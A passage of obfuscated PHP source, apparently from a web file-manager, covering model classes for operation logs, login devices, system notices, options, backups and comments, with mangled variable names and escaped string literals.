Input::get($µçƒî³ş[508], $µçƒî³ş[7], $µçƒî³ş[2070], array($µçƒî³ş[1988], $µçƒî³ş[502])); $Â à¸íí = $ùÉ·¹òí[$Â à¸íí]; $ÎÕ©„½ƒ = $ÎÕ©„½ƒ . "{$…”ª¨È}\x20{$Â à¸íí}"; return $this->order($ÎÕ©„½ƒ); } public function get($İ„ªµî¬ = '') { $›ƒ®øÅÍ =& $_SERVER[Ö†ØøÖ±]; if (!$İ„ªµî¬) { show_json(array()); } $Ÿ™×ªèú = array(); if ($İ„ªµî¬[$›ƒ®øÅÍ[1699]]) { $Ÿ™×ªèú[$›ƒ®øÅÍ[1699]] = $İ„ªµî¬[$›ƒ®øÅÍ[1699]]; } if (isset($İ„ªµî¬[$›ƒ®øÅÍ[813]])) { $¶˜Ææ¢ø = $İ„ªµî¬[$›ƒ®øÅÍ[813]]; $§Ëş¼÷ô = isset($İ„ªµî¬[$›ƒ®øÅÍ[814]]) ? $İ„ªµî¬[$›ƒ®øÅÍ[814]] : time(); $Ÿ™×ªèú[$›ƒ®øÅÍ[215]] = array($›ƒ®øÅÍ[386], array($¶˜Ææ¢ø, $§Ëş¼÷ô)); } if ($İ„ªµî¬[$›ƒ®øÅÍ[33]]) { $¡ÊÆ†» = explode($›ƒ®øÅÍ[50], $İ„ªµî¬[$›ƒ®øÅÍ[33]]); $ØòÂ‡¦ = $this->typeFile(); $¥°üº = array(); foreach ($¡ÊÆ†» as $€ö—Ã‡¦) { $¥°üº[] = $€ö—Ã‡¦; if (isset($ØòÂ‡¦[$€ö—Ã‡¦])) { $¥°üº = array_merge($¥°üº, $ØòÂ‡¦[$€ö—Ã‡¦]); } } $¥°üº = array_unique($¥°üº); if ($¥°üº) { $Ÿ™×ªèú[$›ƒ®øÅÍ[33]] = array($›ƒ®øÅÍ[7], $¥°üº); } } else { $Ÿ™×ªèú[$›ƒ®øÅÍ[33]] = array($›ƒ®øÅÍ[2322], $›ƒ®øÅÍ[2323]); } if (!empty($İ„ªµî¬[$›ƒ®øÅÍ[2321]])) { $Ÿ™×ªèú[$›ƒ®øÅÍ[503]] = array($›ƒ®øÅÍ[435], "\45{$İ„ªµî¬[$›ƒ®øÅÍ[2321]]}\x25"); } $»ğé—´¿ = $this->_makeOrder()->where($Ÿ™×ªèú)->selectPage(); if (empty($»ğé—´¿[$›ƒ®øÅÍ[422]])) { show_json(array(), !0, $»ğé—´¿[$›ƒ®øÅÍ[419]]); } $»ğé—´¿[$›ƒ®øÅÍ[422]] = $this->logList($»ğé—´¿[$›ƒ®øÅÍ[422]]); return $»ğé—´¿; } private function ipAddress(&$½îÊÑ·‰) { $ëèÈ–©Ê =& $_SERVER[Ö†ØøÖ±]; if (!empty($½îÊÑ·‰[$ëèÈ–©Ê[2321]])) { $îÄşóñÚ = IpLocation::get($½îÊÑ·‰[$ëèÈ–©Ê[2321]]); } else { $îÄşóñÚ = LNG($ëèÈ–©Ê[2324]); } $½îÊÑ·‰[$ëèÈ–©Ê[2325]] = $îÄşóñÚ; } private function descZipDownload($Æ²±ğÉ”, &$ìÓİÎ›Ü) { $œÌ§Æï =& $_SERVER[Ö†ØøÖ±]; if (!isset($Æ²±ğÉ”[$œÌ§Æï[2326]])) { return; } $úÕıÄ°Ó = json_decode($Æ²±ğÉ”[$œÌ§Æï[2326]], !0); foreach ($úÕıÄ°Ó as $¬üê’¼Õ) { try { $ °©‘™¤ = IO::infoFullSimple($¬üê’¼Õ[$œÌ§Æï[84]]); } catch (Exception $š±ª®†ä) { continue; } $Æ²±ğÉ”[$œÌ§Æï[84]] = $¬üê’¼Õ[$œÌ§Æï[84]]; $ìÓİÎ›Ü[] = $Æ²±ğÉ”[$œÌ§Æï[181]] = $ °©‘™¤[$œÌ§Æï[181]]; $ìÓİÎ›Ü[] = $Æ²±ğÉ”[$œÌ§Æï[2125]] = $ °©‘™¤[$œÌ§Æï[180]]; break; } return $Æ²±ğÉ”; } private function getSourceList(&$øĞó¯íú) { $úâ¡Š¸Á =& $_SERVER[Ö†ØøÖ±]; $»‡˜ÎÆß = array(); foreach ($øĞó¯íú as $‹äò×à => $¤ŠÄˆ÷¬) { $®¬ËÏ® = json_decode($¤ŠÄˆ÷¬[$úâ¡Š¸Á[503]], !0); if ($¤ŠÄˆ÷¬[$úâ¡Š¸Á[33]] == $úâ¡Š¸Á[1871]) { $®¬ËÏ® = $this->descZipDownload($®¬ËÏ®, $»‡˜ÎÆß); $øĞó¯íú[$‹äò×à][$úâ¡Š¸Á[503]] = json_encode($®¬ËÏ®); continue; } if (strpos($¤ŠÄˆ÷¬[$úâ¡Š¸Á[33]], $úâ¡Š¸Á[2127]) !== 0) { if (!isset($®¬ËÏ®[$úâ¡Š¸Á[84]]) || strpos($¤ŠÄˆ÷¬[$úâ¡Š¸Á[33]], $úâ¡Š¸Á[2327]) !== 0) { continue; } try { $¾¬Ûá£« = IO::infoFullSimple($®¬ËÏ®[$úâ¡Š¸Á[84]]); } catch (Exception $Áß³ééë) { continue; } $»‡˜ÎÆß[] = $®¬ËÏ®[$úâ¡Š¸Á[181]] = $¾¬Ûá£«[$úâ¡Š¸Á[181]]; $»‡˜ÎÆß[] = $®¬ËÏ®[$úâ¡Š¸Á[2125]] = $¾¬Ûá£«[$úâ¡Š¸Á[180]]; $øĞó¯íú[$‹äò×à][$úâ¡Š¸Á[503]] = json_encode($®¬ËÏ®); continue; } $»‡˜ÎÆß[] = $®¬ËÏ®[$úâ¡Š¸Á[181]]; $»‡˜ÎÆß[] = $®¬ËÏ®[$úâ¡Š¸Á[2125]]; if ($®¬ËÏ®[$úâ¡Š¸Á[33]] == $úâ¡Š¸Á[597]) { $»‡˜ÎÆß[] = $®¬ËÏ®[$úâ¡Š¸Á[503]][$úâ¡Š¸Á[1213]]; $»‡˜ÎÆß[] = $®¬ËÏ®[$úâ¡Š¸Á[503]][$úâ¡Š¸Á[1214]]; } if ($®¬ËÏ®[$úâ¡Š¸Á[33]] == $úâ¡Š¸Á[2135]) { $»‡˜ÎÆß[] = $®¬ËÏ®[$úâ¡Š¸Á[503]][$úâ¡Š¸Á[181]]; } } if (!$»‡˜ÎÆß) { return array(); } return Model($úâ¡Š¸Á[878])->sourceListInfo($»‡˜ÎÆß, !0); } private function logList($­µƒÒŠ„) { $ˆ£üÏ =& $_SERVER[Ö†ØøÖ±]; $•’Ñù¢ = array_to_keyvalue($­µƒÒŠ„, $ˆ£üÏ[12], $ˆ£üÏ[1699]); $à½‚… = Model($ˆ£üÏ[576])->userListInfo(array_unique($•’Ñù¢)); $à  ¹±Õ = $this->getSourceList($­µƒÒŠ„); $ûÂûÅœ„ = $this->typeAll(); $şƒªü– = array(); $ÜñÑÈˆ• = array(); foreach ($­µƒÒŠ„ as $ÁÓ‡ˆ¿ö => $®É½©Öà) { $³‡éŒß = $®É½©Öà[$ˆ£üÏ[33]]; $Õ¥—Éø¿ = isset($à½‚…[$®É½©Öà[$ˆ£üÏ[1699]]]) ? $à½‚…[$®É½©Öà[$ˆ£üÏ[1699]]] : !1; $¢Œ§„’ş = strpos($³‡éŒß, $ˆ£üÏ[2328]) === 0 ? LNG($ˆ£üÏ[2329]) : LNG($ˆ£üÏ[2324]); $®É½©Öà[$ˆ£üÏ[32]] = isset($Õ¥—Éø¿[$ˆ£üÏ[32]]) ? $Õ¥—Éø¿[$ˆ£üÏ[32]] : LNG($ˆ£üÏ[2324]); $®É½©Öà[$ˆ£üÏ[2179]] = isset($Õ¥—Éø¿[$ˆ£üÏ[2179]]) ? $Õ¥—Éø¿[$ˆ£üÏ[2179]] : $ˆ£üÏ[12]; $®É½©Öà[$ˆ£üÏ[1596]] = isset($ûÂûÅœ„[$³‡éŒß]) ? $ûÂûÅœ„[$³‡éŒß] : $¢Œ§„’ş; $®É½©Öà[$ˆ£üÏ[2069]] = $Õ¥—Éø¿; $ƒÛˆ˜¸Å = json_decode($®É½©Öà[$ˆ£üÏ[503]], !0); $®É½©Öà[$ˆ£üÏ[2321]] = isset($ƒÛˆ˜¸Å[$ˆ£üÏ[2321]]) ? $ƒÛˆ˜¸Å[$ˆ£üÏ[2321]] : $ˆ£üÏ[12]; $®É½©Öà[$ˆ£üÏ[2325]] = IpLocation::get($®É½©Öà[$ˆ£üÏ[2321]]); if (strpos($³‡éŒß, $ˆ£üÏ[2127]) === 0 || isset($ƒÛˆ˜¸Å[$ˆ£üÏ[2125]])) { $ƒÛˆ˜¸Å[$ˆ£üÏ[87]] = $à  ¹±Õ[$ƒÛˆ˜¸Å[$ˆ£üÏ[181]]]; $ƒÛˆ˜¸Å[$ˆ£üÏ[2140]] = $à  ¹±Õ[$ƒÛˆ˜¸Å[$ˆ£üÏ[2125]]]; if ($ƒÛˆ˜¸Å[$ˆ£üÏ[33]] == $ˆ£üÏ[597]) { $ƒÛˆ˜¸Å[$ˆ£üÏ[503]][$ˆ£üÏ[1213]] = $à  ¹±Õ[$ƒÛˆ˜¸Å[$ˆ£üÏ[503]][$ˆ£üÏ[1213]]]; $ƒÛˆ˜¸Å[$ˆ£üÏ[503]][$ˆ£üÏ[1214]] = $à  ¹±Õ[$ƒÛˆ˜¸Å[$ˆ£üÏ[503]][$ˆ£üÏ[1214]]]; } if ($ƒÛˆ˜¸Å[$ˆ£üÏ[33]] == $ˆ£üÏ[2135]) { $ƒÛˆ˜¸Å[$ˆ£üÏ[503]][$ˆ£üÏ[181]] = $à  ¹±Õ[$ƒÛˆ˜¸Å[$ˆ£üÏ[503]][$ˆ£üÏ[181]]]; } if ($ƒÛˆ˜¸Å[$ˆ£üÏ[33]] == $ˆ£üÏ[1866]) { $ƒÛˆ˜¸Å[$ˆ£üÏ[2140]] = $ƒÛˆ˜¸Å[$ˆ£üÏ[87]]; $ƒÛˆ˜¸Å[$ˆ£üÏ[2125]] = $ƒÛˆ˜¸Å[$ˆ£üÏ[2140]][$ˆ£üÏ[181]]; $ƒÛˆ˜¸Å[$ˆ£üÏ[87]] = !1; $ƒÛˆ˜¸Å[$ˆ£üÏ[181]] = $ˆ£üÏ[12]; } if ($ƒÛˆ˜¸Å[$ˆ£üÏ[87]] && $ƒÛˆ˜¸Å[$ˆ£üÏ[87]][$ˆ£üÏ[178]] == $ˆ£üÏ[179]) { $ÜñÑÈˆ•[] = $®É½©Öà[$ˆ£üÏ[451]]; unset($­µƒÒŠ„[$ÁÓ‡ˆ¿ö]); continue; } if ($ƒÛˆ˜¸Å[$ˆ£üÏ[2140]] && $ƒÛˆ˜¸Å[$ˆ£üÏ[2140]][$ˆ£üÏ[178]] == $ˆ£üÏ[179]) { $ÜñÑÈˆ•[] = $®É½©Öà[$ˆ£üÏ[451]]; unset($­µƒÒŠ„[$ÁÓ‡ˆ¿ö]); continue; } } $®É½©Öà[$ˆ£üÏ[503]] = $ƒÛˆ˜¸Å; unset($®É½©Öà[$ˆ£üÏ[2330]]); $şƒªü–[] = $®É½©Öà; } $this->clearSystemPathLog($ÜñÑÈˆ•); return $şƒªü–; } private function clearSystemPathLog($×ÍÏÑÙ¢) { $æ†¹Ãş =& $_SERVER[Ö†ØøÖ±]; if (count($×ÍÏÑÙ¢) == 0) { return; } $ƒ›­öË÷ = array($æ†¹Ãş[451] => array($æ†¹Ãş[7], array_unique($×ÍÏÑÙ¢))); $this->where($ƒ›­öË÷)->delete(); } public function deviceList($é…ı¼¡¸, $ÚÀªÆòò = 0) { $‰ Ğ¨¦Ÿ =& $_SERVER[Ö†ØøÖ±]; $‡ºòåõ  = array($‰ Ğ¨¦Ÿ[1699] => $é…ı¼¡¸, $‰ Ğ¨¦Ÿ[215] => array($‰ Ğ¨¦Ÿ[1067], $ÚÀªÆòò), $‰ Ğ¨¦Ÿ[33] => $‰ Ğ¨¦Ÿ[1840]); $¦Ù¾”Û = array(); $Æ¢¤îó = $this->field($‰ Ğ¨¦Ÿ[2331])->where($‡ºòåõ )->order($‰ Ğ¨¦Ÿ[2138])->limit(50)->select(); foreach ($Æ¢¤îó as $¼‰ºÆöü => $×ëĞ†ñÕ) { if ($¼‰ºÆöü > 0 && abs($×ëĞ†ñÕ[$‰ Ğ¨¦Ÿ[215]] - $Æ¢¤îó[$¼‰ºÆöü - 1][$‰ Ğ¨¦Ÿ[215]]) < 5) { continue; } $íâ€¶ó = json_decode($×ëĞ†ñÕ[$‰ Ğ¨¦Ÿ[503]], !0); $×ëĞ†ñÕ[$‰ Ğ¨¦Ÿ[2321]] = isset($íâ€¶ó[$‰ Ğ¨¦Ÿ[2321]]) ? $íâ€¶ó[$‰ Ğ¨¦Ÿ[2321]] : $‰ Ğ¨¦Ÿ[12]; unset($íâ€¶ó[$‰ Ğ¨¦Ÿ[2321]]); $é®Á…‘ñ = $this->deviceType($íâ€¶ó[$‰ Ğ¨¦Ÿ[2128]]); if (isset($¦Ù¾”Û[$é®Á…‘ñ])) { continue; } $×ëĞ†ñÕ[$‰ Ğ¨¦Ÿ[2325]] = IpLocation::get($×ëĞ†ñÕ[$‰ Ğ¨¦Ÿ[2321]]); $×ëĞ†ñÕ[$‰ Ğ¨¦Ÿ[503]] = $íâ€¶ó; $¦Ù¾”Û[$é®Á…‘ñ] = $×ëĞ†ñÕ; } return array_values($¦Ù¾”Û); } public function deviceType($ÌËˆ‹Œ) { return $ÌËˆ‹Œ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\156\157\164\151\x63\x65\114\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\x63\x6f\156\164\x65\156\164", "\141\x75\x74\x68", "\x6d\157\144\x65", "\164\x69\155\x65", "\x74\x79\160\145", "\154\145\x76\145\x6c", "\x65\x6e\x61\x62\x6c\x65", "\163\x6f\162\x74"); public function listData($†“áÛœ¿ = false, $ß—£Ÿş = "\163\157\162\x74", $ş´©çˆ³ = false) { return parent::listData($†“áÛœ¿, $ß—£Ÿş, $ş´©çˆ³); } public function add($£ï§¿‡¢) { $µØâ± =& $_SERVER[Ö†ØøÖ±]; $ èš¸ˆ– = time(); if ($£ï§¿‡¢[$µØâ±[16]] == $µØâ±[2332]) { $ èš¸ˆ– = strtotime($£ï§¿‡¢[$µØâ±[194]]); } $£ï§¿‡¢[$µØâ±[194]] = $ èš¸ˆ–; return parent::insert($£ï§¿‡¢); } public function update($‚ÓŒ¸Æ˜, $ğªÃ„Øˆ) { $ï©œù˜ =& $_SERVER[Ö†ØøÖ±]; $’½İƒ³à = $this->listData($‚ÓŒ¸Æ˜); if (!$’½İƒ³à) { return !1; } $ğÛş¸õ² = time(); if ($ğªÃ„Øˆ[$ï©œù˜[16]] == $ï©œù˜[2332]) { $ğÛş¸õ² = strtotime($ğªÃ„Øˆ[$ï©œù˜[194]]); } $ğªÃ„Øˆ[$ï©œù˜[194]] = $ğÛş¸õ²; return parent::update($‚ÓŒ¸Æ˜, $ğªÃ„Øˆ); } public function remove($ª÷™°Éó) { $Œ»»§¶ = $this->listData($ª÷™°Éó); if (!$Œ»»§¶ || $Œ»»§¶[$_SERVER[Ö†ØøÖ±][179]]) { return !1; } return parent::remove($ª÷™°Éó); } public function sort($Øã—øõ…, $Ç´Éø»İ) { return parent::update($Øã—øõ…, $Ç´Éø»İ); } public function enable($ş¸ÓÁ€Ü, $ıã¿½ö) { return parent::update($ş¸ÓÁ€Ü, array($_SERVER[Ö†ØøÖ±][2333] => $ıã¿½ö)); } private function initUserOption() { $Š‡¸ºÒì =& $_SERVER[Ö†ØøÖ±]; $this->optionType = $Š‡¸ºÒì[2334]; $this->modelType = $Š‡¸ºÒì[2335]; $this->field = array($Š‡¸ºÒì[2336], $Š‡¸ºÒì[32], $Š‡¸ºÒì[194], $Š‡¸ºÒì[33], $Š‡¸ºÒì[2337], $Š‡¸ºÒì[803], $Š‡¸ºÒì[210]); } public function userNoticeGet($°ˆ’”Ä = false) { $this->initUserOption(); return parent::listData($°ˆ’”Ä, $_SERVER[Ö†ØøÖ±][451], !0); } public function userNoticeAdd($¡»Å•²ü) { $±Šì“ë” =& $_SERVER[Ö†ØøÖ±]; $this->initUserOption(); $ÊËÕËÍæ = $this->findByKey($±Šì“ë”[2336], $¡»Å•²ü[$±Šì“ë”[451]]); if ($ÊËÕËÍæ) { return !0; } $†•³û = array($±Šì“ë”[2336] => $¡»Å•²ü[$±Šì“ë”[451]], $±Šì“ë”[32] => $¡»Å•²ü[$±Šì“ë”[32]], $±Šì“ë”[194] => $¡»Å•²ü[$±Šì“ë”[194]], $±Šì“ë”[33] => isset($¡»Å•²ü[$±Šì“ë”[33]]) ? $¡»Å•²ü[$±Šì“ë”[33]] : 1, $±Šì“ë”[2337] => isset($¡»Å•²ü[$±Šì“ë”[2337]]) ? $¡»Å•²ü[$±Šì“ë”[2337]] : 0, $±Šì“ë”[803] => 0, $±Šì“ë”[210] => 0); return parent::insert($†•³û); } public function userNoticeEdit($„àö™±Ä, $êóÜ±Ğ•) { $this->initUserOption(); return parent::update($„àö™±Ä, $êóÜ±Ğ•); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\164\x65\x6d\x5f\157\x70\x74\151\157\156"; protected $jsonField = array("\x6d\145\156\x75", "\162\157\154\145", "\162\157\154\x65\107\162\157\165\x70", "\162\145\x67\151\x73\164", "\x65\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($µ—¤…£) { return "\x53\x79\x73\164\x65\x6d\117\160\x74\x69\157\156\x5f{$µ—¤…£}"; } protected function optionDefault($ª”ñˆï = '') { $âÚãß· =& $_SERVER[Ö†ØøÖ±]; if ($ª”ñˆï == $âÚãß·[12]) { return $GLOBALS[$âÚãß·[6]][$âÚãß·[433]]; } } } goto D®Â®ˆ‚ºë; f…éğÜÑ™¿: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\x62\141\143\153\x75\x70\114\151\x73\x74"; public $field = array("\151\x6f", "\x6e\x61\155\x65", "\x73\x74\141\164\x75\163", "\143\x6f\156\164\x65\156\164", "\x6d\x61\x6e\x75\141\x6c", "\162\x65\163\165\x6c\164", "\164\151\x6d\x65\106\162\157\x6d", "\164\x69\155\145\x54\157"); public function config() { $í¥Áµ½¤ =& $_SERVER[Ö†ØøÖ±]; $İÎ¸¦÷® = Model($í¥Áµ½¤[823])->get($í¥Áµ½¤[833]); $İÎ¸¦÷® = json_decode($İÎ¸¦÷®, !0); $İÎ¸¦÷® = is_array($İÎ¸¦÷®) ? $İÎ¸¦÷® : array(); if (!isset($İÎ¸¦÷®[$í¥Áµ½¤[807]])) { $İÎ¸¦÷®[$í¥Áµ½¤[807]] = $í¥Áµ½¤[88]; } unset($İÎ¸¦÷®[$í¥Áµ½¤[1669]]); Action($í¥Áµ½¤[1922])->taskInit(); Model($í¥Áµ½¤[1668])->cacheClear(); $ôãßç½¦ = $í¥Áµ½¤[1923]; $‹“îÁı¾ = Model($í¥Áµ½¤[1924])->findByKey($í¥Áµ½¤[1687], $ôãßç½¦); if (!$‹“îÁı¾) { $‹“îÁı¾ = array(); } if (isset($‹“îÁı¾[$í¥Áµ½¤[194]])) { $‹“îÁı¾[$í¥Áµ½¤[194]] = json_decode($‹“îÁı¾[$í¥Áµ½¤[194]], !0); } if (isset($İÎ¸¦÷®[$í¥Áµ½¤[194]])) { $‹“îÁı¾[$í¥Áµ½¤[194]][$í¥Áµ½¤[1672]] = $İÎ¸¦÷®[$í¥Áµ½¤[194]]; unset($İÎ¸¦÷®[$í¥Áµ½¤[194]]); } return array_merge($‹“îÁı¾, $İÎ¸¦÷®); } public function listData($î¦¬ëïì = false, $ê– = "\155\157\x64\151\x66\x79\124\151\155\145", $¢ôıİØÉ = false) { return parent::listData($î¦¬ëïì, $ê–, !0); } public function lastItem() { $İŠ«©Àğ = $this->listData(); return !empty($İŠ«©Àğ[0]) ? $İŠ«©Àğ[0] : null; } public function kill($»Œ¬ıı½) { $äÂòê¾ =& $_SERVER[Ö†ØøÖ±]; $ÛÇÜâç¹ = $this->listData($»Œ¬ıı½); if (!$ÛÇÜâç¹ || empty($ÛÇÜâç¹[$äÂòê¾[32]])) { return !0; } Task::kill($äÂòê¾[832]); Task::kill($äÂòê¾[853]); Task::kill($äÂòê¾[862]); $Ï’ÊªÜÒ = $ÛÇÜâç¹[$äÂòê¾[32]]; $Æ…úúø = TEMP_FILES . $äÂòê¾[831] . $Ï’ÊªÜÒ . $äÂòê¾[8]; IO::remove($Æ…úúø, !1); return $this->remove($»Œ¬ıı½); } public function remove($²Ïëë¢À) { $´óúµ³× = $this->listData($²Ïëë¢À); if (!$´óúµ³×) { return !0; } return $this->backupRemove($´óúµ³×); } private function backupRemove($·¿Ã‘ú») { parent::remove($·¿Ã‘ú»[$_SERVER[Ö†ØøÖ±][451]]); $È›Ô™Ş† = $this->backupPath($·¿Ã‘ú»); IO::remove($È›Ô™Ş†, !1); return !0; } private function backupPath($„à¸‘åî) { $€¬ÒôğÖ =& $_SERVER[Ö†ØøÖ±]; $ŞîçŠà… = $„à¸‘åî[$€¬ÒôğÖ[32]]; $ì¤£ˆ‰ = Model($€¬ÒôğÖ[823])->get($€¬ÒôğÖ[824]); $±åßù’¦ = substr(md5($€¬ÒôğÖ[825] . $ì¤£ˆ‰ . $ŞîçŠà…), 0, 8); return "\173\151\x6f\72{$„à¸‘åî[$€¬ÒôğÖ[804]]}\175\57\144\141\164\x61\x62\x61\x73\x65\57\x62\141\x63\x6b\165\160\57" . $ŞîçŠà… . $€¬ÒôğÖ[11] . $±åßù’¦; } public function start() { $‹Ëø‰¢ =& $_SERVER[Ö†ØøÖ±]; if ($GLOBALS[$‹Ëø‰¢[6]][$‹Ëø‰¢[89]][$‹Ëø‰¢[1925]] != $‹Ëø‰¢[88]) { return !0; } $şõš×ªÏ = $this->config(); if (!$şõš×ªÏ || $şõš×ªÏ[$‹Ëø‰¢[1669]] != $‹Ëø‰¢[88]) { return !1; } $ºïÇç…é = $this->process(); foreach ($ºïÇç…é as $Çù¢ôŒ—) { if ($Çù¢ôŒ—) { return Task::restart($Çù¢ôŒ—[$‹Ëø‰¢[451]]); } } $•œğñô = new Backup(); $•ñòÁ­ = $•œğñô->db(); if ($•ñòÁ­) { $•ñòÁ­ = $•œğñô->dbFile(); if ($•ñòÁ­ && $şõš×ªÏ[$‹Ëø‰¢[807]] == $‹Ëø‰¢[212]) { $•ñòÁ­ = $•œğñô->file(); } } Backup::set(array($‹Ëø‰¢[803] => 1, $‹Ëø‰¢[814] => time())); return !0; } public function process() { $Î×¬· =& $_SERVER[Ö†ØøÖ±]; $Ò±Û´ « = array($Î×¬·[810] => Task::get($Î×¬·[832]), $Î×¬·[815] => Task::get($Î×¬·[853]), $Î×¬·[214] => Task::get($Î×¬·[862])); $İ¬²ÙÑÔ = !1; foreach ($Ò±Û´ « as &$úÒ‡†¼) { if ($İ¬²ÙÑÔ) { $úÒ‡†¼ = !1; continue; } if ($úÒ‡†¼) { $ï­Œó˜â = intval(_get($úÒ‡†¼, $Î×¬·[1704], 0)); if (time() - $ï­Œó˜â > 7200) { Task::kill($úÒ‡†¼[$Î×¬·[451]]); $İ¬²ÙÑÔ = !0; $úÒ‡†¼ = !1; } } } return $Ò±Û´ «; } public function restore() { $‘çƒŒà½ =& $_SERVER[Ö†ØøÖ±]; ActionCall($‘çƒŒà½[1113], !0, 1); ActionCall($‘çƒŒà½[1113], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\x6d\145\x6e\164"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\x61\x6d\145" => "\x63\157\155\155\145\x6e\164\x5f\x6d\145\x74\141", "\x6d\x65\x74\141\106\151\145\154\144" => "\x63\x6f\x6d\x6d\145\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($‘Ä²‘èô) { $°ıÕãıö =& $_SERVER[Ö†ØøÖ±]; if ($‘Ä²‘èô[$°ıÕãıö[1926]]) { $˜á¢üò£ = $this->where(array($°ıÕãıö[1927] => $‘Ä²‘èô[$°ıÕãıö[1926]]))->find(); if (!$˜á¢üò£ || $˜á¢üò£[$°ıÕãıö[178]] != $‘Ä²‘èô[$°ıÕãıö[178]] || $˜á¢üò£[$°ıÕãıö[547]] != $‘Ä²‘èô[$°ıÕãıö[547]]) { return !1; } $this->where(array($°ıÕãıö[1927] => $‘Ä²‘èô[$°ıÕãıö[1926]]))->setAdd($°ıÕãıö[1928], 1); } $‘Ä²‘èô[$°ıÕãıö[1929]] = 0; $‘Ä²‘èô[$°ıÕãıö[1928]] = 0; $‘Ä²‘èô[$°ıÕãıö[803]] = 1; return $this->add($‘Ä²‘èô); } public function commentCount($õ¤½Øş, $ºâÓÊÕ´, $¥Á¿à´è = false) { $§½ÉšÜ =& $_SERVER[Ö†ØøÖ±]; if (!$õ¤½Øş) { return array(); } if (is_string($õ¤½Øş) || is_int($õ¤½Øş)) { $õ¤½Øş = array($õ¤½Øş); } $İ¥åõì€ = array($§½ÉšÜ[547], $§½ÉšÜ[1930] => $§½ÉšÜ[542]); $®ßôÏí— = array($§½ÉšÜ[547] => array($§½ÉšÜ[7], $õ¤½Øş), $§½ÉšÜ[178] => $ºâÓÊÕ´); if ($¥Á¿à´è) { $®ßôÏí—[$§½ÉšÜ[1699]] = $¥Á¿à´è; } $ÉææÚùÎ = $this->field($İ¥åõì€)->where($®ßôÏí—)->group($§½ÉšÜ[547])->select(); return array_to_keyvalue($ÉææÚùÎ, $§½ÉšÜ[547], $§½ÉšÜ[542]); } public function starTarget($æíÙ«…ö, $ÊÍ¿¦øá) { $™ÇÏÕŠ =& $_SERVER[Ö†ØøÖ±]; $•ÈôÁ¯® = $æíÙ«…ö + self::TYPE_STAR_OFFSET; $Ê¾ºûÖº = array($™ÇÏÕŠ[1699] => USER_ID, $™ÇÏÕŠ[178] => $•ÈôÁ¯®, $™ÇÏÕŠ[547] => $ÊÍ¿¦øá); $…è’²‡ = $this->where($Ê¾ºûÖº)->find(); if ($…è’²‡) { return $this->where(array($™ÇÏÕŠ[451] => $…è’²‡[$™ÇÏÕŠ[451]]))->delete(); } $‹³Ãü  = array($™ÇÏÕŠ[1926] => 0, $™ÇÏÕŠ[1699] => USER_ID, $™ÇÏÕŠ[803] => 1, $™ÇÏÕŠ[807] => $™ÇÏÕŠ[12], $™ÇÏÕŠ[178] => $•ÈôÁ¯®, $™ÇÏÕŠ[547] => $ÊÍ¿¦øá, $™ÇÏÕŠ[1929] => 0, $™ÇÏÕŠ[1928] => 0); return $this->add($‹³Ãü ); } public function starTargetCount($„œ®§œœ, $¯›ì˜Åœ) { $ÀÒöö²Û =& $_SERVER[Ö†ØøÖ±]; $ïÃ©®¦ = $¯›ì˜Åœ + self::TYPE_STAR_OFFSET; $Å¢„Èü = $this->commentCount($„œ®§œœ, $ïÃ©®¦); $ÀÜçıŸÑ = $this->commentCount($„œ®§œœ, $ïÃ©®¦, USER_ID); return array($ÀÒöö²Û[1931] => $Å¢„Èü, $ÀÒöö²Û[1932] => $ÀÜçıŸÑ); } public function starTargetUserList($™ÌëƒØ, $Šó£ƒİÚ) { $‹é²´ó =& $_SERVER[Ö†ØøÖ±]; $´Ø¸‹Óë = $™ÌëƒØ + self::TYPE_STAR_OFFSET; $¬ãëá±® = array($‹é²´ó[547] => $Šó£ƒİÚ, $‹é²´ó[178] => $´Ø¸‹Óë); $´Ü¶ğÎ = $this->where($¬ãëá±®)->count(); $ş¨íçÌ = array($‹é²´ó[308] => $´Ü¶ğÎ, $‹é²´ó[1933] => array()); if (!$´Ü¶ğÎ) { return $ş¨íçÌ; } $ÆÊµ‹†· = $this->field($‹é²´ó[1699])->where($¬ãëá±®)->limit(500)->select(); $ÆÊµ‹†· = array_to_keyvalue($ÆÊµ‹†·, $‹é²´ó[12], $‹é²´ó[1699]); $ş¨íçÌ[$‹é²´ó[1933]] = Model($‹é²´ó[555])->userListInfo($ÆÊµ‹†·); return $ş¨íçÌ; } public function prasiseUserList($ì¿ìêŒÏ) { $¶¢ÊÂ×» =& $_SERVER[Ö†ØøÖ±]; $§ƒ©…¯Û = array($¶¢ÊÂ×»[1934] => $ì¿ìêŒÏ); $…Ò§¤ï = $this->where($§ƒ©…¯Û)->find(); $ÊÂƒÇ™ã = _get($…Ò§¤ï, $¶¢ÊÂ×»[1929], 0); $ıåİÚÃĞ = array($¶¢ÊÂ×»[308] => $ÊÂƒÇ™ã, $¶¢ÊÂ×»[1933] => array()); if (!$ÊÂƒÇ™ã) { return $ıåİÚÃĞ; } $ÊŸÑ¦Şö = Model($¶¢ÊÂ×»[1935])->field($¶¢ÊÂ×»[1699])->where($§ƒ©…¯Û)->limit(500)->select(); $ÊŸÑ¦Şö = array_to_keyvalue($ÊŸÑ¦Şö, $¶¢ÊÂ×»[12], $¶¢ÊÂ×»[1699]); $ıåİÚÃĞ[$¶¢ÊÂ×»[1933]] = Model($¶¢ÊÂ×»[555])->userListInfo($ÊŸÑ¦Şö); return $ıåİÚÃĞ; } public function remove($—Ì…Ö ) { $ïüÑ“¤ =& $_SERVER[Ö†ØøÖ±]; $àÓ‡™˜ü = array($ïüÑ“¤[1927] => $—Ì…Ö ); $¢õùÙÔ  = $this->where($àÓ‡™˜ü)->find(); if ($¢õùÙÔ [$ïüÑ“¤[1926]]) { $this->where(array($ïüÑ“¤[1927] => $¢õùÙÔ [$ïüÑ“¤[1926]]))->setAdd($ïüÑ“¤[1928], -1); } return $this->where($àÓ‡™˜ü)->delete(); } public function edit($íß³Â·ş, 